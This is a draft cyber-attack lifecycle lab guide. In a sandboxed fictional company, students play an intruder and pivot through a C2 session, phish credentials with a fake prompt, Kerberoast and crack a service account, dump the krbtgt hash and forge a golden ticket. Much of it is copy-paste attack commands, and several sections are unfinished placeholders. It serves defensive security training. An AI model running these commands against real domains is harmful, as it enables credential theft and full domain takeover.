# Cyber Attack Lifecycle Lab

## Welcome!

Welcome to the Feline Cyber attack lifecycle lab! In this lab you will assume the identity of an intruder to learn how intruders work to compromise your infrastructure. We will go through the different stages such as reconnaisance, initial access, lateral movement and persistence and more.
Suitable audience are CISOs, Security and Network Architects/Engineers.

The lab is not about learning hacking tools or how to create malware bypassing defenses. Rather it explains how an intruder gains access and what the intruder can do. You will also learn that the intruder tries to be very stealthy, avoiding noisy exploitation, scanning and things that would create alarms from your cyber defense systems.

The lab has been designed so you do not have to type long commands in a linux shell, instead you can copy and paste and focus on the why from the attackers perspective.

## Your Mission

You will assume the identity of an evil intruder. Your mission - should you choose to accept it - is to compromise an enterprise "Cruel Testing LTD ". As you will notice, the enterprise is run by cats. This enterprise does animal testing on rats, something you very much oppose. Your compromise of Cruel Testing  should be complete. You should gain persistent complete control of their infrastructure and you should be able to help your rat friends and set them free.

If you accept the mission, start by browsing to http://www.crueltesting.com, to learn about your target.

![Cruel Testing](assets/cruelwebsite1.png)


## Lab Access and Topology

All you need to access the lab is internet access with a browser (http). Chrome browser is recommended since it allows for easy copy/paste from instructions to lab.

The lab topology is shown in the figure below. From your laptop you will access a guacamole server, from which you can access the lab environment. You will do almost all the work from evil, the attackers machine. But you will also have access to the windows 11 client machine to simulate a target user (garfield) opening files downloaded from the internet or inadvertantly helping the intruder (you).

Note that Cruel Computing has put a state-of-the-art Next Gen Firewall in place that blocks all incoming traffic from the external network (evil machine) to the internal network and the DMZ.

![Lab Topology](assets/lab-topology.png)

You will have your student number, (1,2,3....15) and a password provided by your proctor.

Access the lab by going to http://guac<number>.felinecyber.com. So if your are group 8 it would be http://guac8.felinecyber.com.

![Guacamole Login Page](assets/guac-login.png)

Ignore the warnings that the session is not secure/encrypted and proceed.

Login with the username guacadmin and the password supplied by your proctor.
You may be presented with a window asking your permission to copy/paste stuff. Click Accept

You will now see different connection options, the ones you will use in this lab are evil-rdp and garfield-client. Right click both options to open a new tab in your browser so you have instant access to both. You should not need the other connections for this lab.

Click on your evil-rdp tab to get access to the attacking machine. Open a terminal window and type startlab as shown in the picture. This should open up a terminal window with different tabs that we will use  in this lab.

```
startlab
```

![Guacamole Login Page](assets/startlab.png)

Two of the tabs opened are for linux shell commands.
We also have one command running a web server on evil and one for running sliver which is our Command and Control (C2) system.

## Reconnaisance

The intruder's (your) first step is to find out about your target. From their website http://www.crueltesting.com you would already have learned about their disgusting business practices. But you would also have learned about some of their employees, like their CEO and founder (scratchy), their CISO (Schroedinger's) and their Help Desk Director (garfield).

![Cruel Testing Stakeholders ](assets/cruel-cats.png)

Let's not waste time trying to hack Cruel Testing by their public website. It is a completely static webpage hosted on cloudflare (outside of the network topology we are working with). Instead we try to hack the users. The most interesting user here is <i>garfield</i> since he is in IT and may have more privileges than even the senior CEO and CISO.

You now use OSINT (Open Sources Intelligence) to discover more about the company and their users. A really good source for people in the IT industry is linkedin. After searching for garfield at cruel testing you find this information

![Garfield Linkedin](assets/garfield-linkedin.png)

We learn that Garfield is a help desk support guys with knowledge of Windows and Active Directory, so we can assume Cruel Computing use that. We also learn that he may be open to new job offers.

### What about scanning Cruel Computing for Open Ports?

We all know about scanning, how an intruder would find open port and vulnerabilities.

Of course our recon could also involve scanning Cruel Computing Internal Network for exposed servers with vulnerabilities, but it will not succeed since their pricey FW is blocking everything inbound.

But do not take our word for it, from your RDP session to evil, try running the famous nmap to scan the internal targets from the outside.

From the terminal window choose a tab with a shell on evil, and paste

```
nmap -Pn 10.0.2.10 10.0.3.6 -p 80,443,445
```
Evil will here try reachability on ports 80,443 (web), 445 (microsoft stuff) on the domain controller and the kubernetes host behind the firewall.

You will get the result, nothing is open.

![Nmap scan](assets/nmap .png)

Should we give up our mission?

But we do not need any open ports! We do not care that their Firewall blocks everything from the outside.
We know some users and can guess their emails!

## Initial Compromise

### Phishing

Even if we cannot go directly for our target website, we can attack the humans (or cats in this case).

** note, it is much more difficult to trick a cat than a human

Traditionally phishing is done by email (even though phishing via SMS, Social Media have increased a lot)

So let us send an email from the intruder to Garfield, the helpdesk guy.

On your browser tab for evil

<sendemail ... options to send email with phishing text to garfield from evl >

On your c1-garfield machine, open the firefox or edge browser to see you have received the mail.

### Execution of Malware

Typically, phishing will trick the user to download a file to execute, or follow link (where file may be downloaded and executed).

The defender (Cruel Testing) will have EDR in place to try to block this. But blocking malware is difficult.

Here we have the Cat and Mouse game! If you google EDR evation you will get lots of hits, here are some from 2026
- link1 to be filled in
- link2 to befilled in

Note that shortly after the attacks above being published, the defenders typically have an update that blocks the attack.

This lab will assume that the intitial compromise has been succesful, for that reason, in the lab environment, windows defender has been disabled to produce a predictable lab.

Do not make the mistake believing Your EDR would block all attacks!

So now let us assume that the malware is executed.

#### Information only (why malware detection by EDR  is not easy)

.. discuss why it is difficult to distinguish a remote access tool from a legit managment tool in 2-3 sentences...
#### Information only (stagers)

.. discuss why a small stager that can bypass EDR by downloading a dll

### Execute stager

In this lab, we will not further dwell into EDR evasion. So use your tab to client and click on the file on the desktop stager.exe.

Note that a real attacker may name the file a bit more stealthy, like chromeupdate.exe.


<picure of desktop on c1>

## Command and Control and Pivoting

On evil, check the sliver tab. You should now see a new session.

In the sliver tab do

sessions -i <name of session>

### Situational Awareness : Learning about the compromised environment.

You are now in control of garfield machine. Let us learn more about it.

<sliver commmands to learn more aobut the system, info, ls, pwd etc.>

### Pivoting to to other sytems

Now that we control one system, we ca actually reach any other system on the inside, in spite of the firewall blocking incoming traffic. This is shown in picture below

<picture showing access to internal systems via outgoing session from compromised machine >

First let us verifywe cannot reach the internal system at 10.0.3.6 on port 80, in the shell command window
execute a netcat command that tries to connect to port 80 on internal server 10.0.3.6

nc -w 3 -v 10.0.3.6 80

The command will time out
From sliver session execute the command

socks5 start

Now we can access internal systems via the socks proxy, we prove that by prepending proxychains
in front of the previous command

proxychains nc -w 3 -v 10.0.3.6 80

The command succeeds since we are now using the socks proxy!

We can also use a web browser directly! Start firefox with

firefox

## Attacking the Active Directory Infrastructure

Most enterprises today rely on Microsoft Active Directory, .... bla bla. For the intruder, compromising the Active Directory would typically allow him total control of the whole IT infrastructure, including applications, OT systems and more. These attacks can be extremely difficult to defend against since the intruder will abuse the way protocols work and are designed, rather than vulnerabilities that can be patched.

### Getting Garfield AD Credentials

As a first foothold we need some credentials in the domain cruelcomputing.com. Unfortunately, our sliver session does not run with any interesting privileges so we cannot easily escalate our local privileges on the machine (to SYSTEM privileges) and dump credentials from memory or registry.

But, we can ask politely.

In our sliver session tab, type

c2tc-askcreds for "garfield@hacklab.crueltesting"

Now go back to your tab for the RDP session to client1 cruelcomputing. You will see that a window has opened asking garfield for his credentials.

Type something in that window simulating garfield falling for the trap (garfields password is catsRCute2026!)

Back in your sliver session window you will see what garfield typed.

### Recon of AD with Bloodhound

The active directory stores information about every user and service in the active directory domain. Users and services are typically assigned to groups, to which privileges can be assigned. The most privileged groups are Enterprise Admins and Domain Admins.
The ultimate target of the intruder is to compromise one of the most privileged accounts.

Armed with the username and password of garfield we cannow learn about the target active directory. Note that we the intruder can do the mapping even though our victim (garfield) is just a regular user. This is because the directory allows plenty of read access to all their users.

We will use a populare tool - bloodhound - for our recon. In a command shell window type

proxychains4 bloodhound-python -u 'garfield' -p 'catsRCute2026!' -d 'crueltesting.com' -dc dc01.crueltesting.com -gc dc01.crueltesting.com -ns 10.0.2.10 --dns-tcp -c All --zip

This will use our relay function to contact the Active Directory Domain Controller to extract information.
As a result a zip file is created on our evil machine.

Next start the bloodhound server on our evil machine, in order to examine the results via a GUI.
From a command shell window type

docker compose -f /home/localadmin/tools/bloodhound/docker-compose.yml up -d

You cannow open bloodhound to investigate the active directory domain, and potential ways of elevating our current measly privileges.

(explanation of bloodhound GUI, searching for paths etc , will fill in later)

### Kerberoasting

### Kerberos Brief Intro

(will add stuff here later, with pictures showing kerberos from the attackers perspective)

### Getting and cracking the hashes of the privileged service account
From bloodhound we learned that there is a service account svc_sql that is a member of the domain admins.

We cannow fetch the hashes of that account and try to crack them offline.

From a command shell type

proxychains GetUserSPNs.py crueltesting.com/garfield:'catsRCute2026!' -dc-ip 10.0.2.10 -no-rc4 -request -outputfile hashes.kerberoast

This should create a file hashes.kerberoast containing the hashes of the password.

We can then try to crack the hashes with hashcat

From a command shell typ

hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt -D 1

Note: Real life cracking of passwords is performed on powerful machines with GPUs, allowing for bruteforcing millions tries per second. In this lab environment with limited hardware we use a wordlist instead.

After some 30 seconds the password should be revealed.

### Golden Tickets

With the credentials of the svc_sql - who is a member of domain admins - we can now grab the hashes for all users and services of the domain (explain how this is done). But one hash is specifically interesting, that is the krbtgt hash, which is used to sign all Kerberos tickets. With this hash we can impersonate any user or service in the domain - even if the password of the user is reset!!! This is like being able to print our own passports.

From a command shell paste the following command

proxychains secretsdump.py crueltesting.com/svc_sql:'SQLServer2026!'@10.0.2.10 -just-dc-user krbtgt
- dumps all hashes aes

The output shows the krbtgt hash.

We now just need to find the security identifier of the domain, we can use

proxychains lookupsid.py dc01.crueltesting.com/svc_sql:'SQLServer2026!'@10.0.2.10

(actually we could also have learned the SID at an earlier stage by the info command on garfields sliver session that gives the user info including the domain SID.)

Now we create the ticket, using the krbttgt hash and the sid. We will create a ticket for felineadmin who is a domain administrator and has access to everything!
Copy this command into your command shell on evil

ticketer.py -aesKey eb31f11533fd623118da514f1a34dc19590e975272717283dcc045c3620d9144 -domain-sid S-1-5-21-65719018-2757245887-2393804531 -domain crueltesting.com felineadmin

We save the ticket in the KRB5CCNAME environment variable

export KRB5CCNAME=felineadmin.ccache

Now we can use smbclient to access the share that we previously had no access to!

From a command shell we paste

proxychains4 smbclient //dc01.crueltesting.com/DomainAdminSecret -k -c 'ls'

(add commands to view the content of the secret file on the share, which should give us a password)

## Pivoting to the Internal Kubernetes Infrastructure

With the Active Directory infrastructure completely compromised, we now turn our efforts to the OT environment of Cruel computing.

We learned from DNS and from the documentes on garfields computer that there is a system "tomcat" that has a vulnerability.

See if we can reach tomcat via our proxy relay

open firefox with proxy and check if you can  go to tomcat.crueltesting.com

### Exploiting the vulnerable server

## Lab Conclusion


